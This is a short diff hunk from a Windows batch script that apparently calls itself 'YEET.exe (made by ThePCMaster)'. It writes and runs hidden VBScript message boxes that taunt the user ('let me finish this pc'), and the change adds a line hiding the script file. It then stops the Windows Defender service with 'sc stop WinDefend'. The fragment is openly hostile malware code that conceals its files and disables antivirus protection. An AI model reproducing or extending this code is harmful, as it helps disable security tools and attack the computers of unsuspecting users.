@@ -53,6 +53,7 @@ wscript yt.vbs
 attrib -h yt.vbs
 del yt.vbs /f
 echo x=msgbox("ok enough talk let me finish this pc",0,"YEET.exe (made by ThePCMaster)")>yt.vbs
+attrib +h yt.vbs
 wscript yt.vbs
 del yt.vbs /f
 sc stop WinDefend
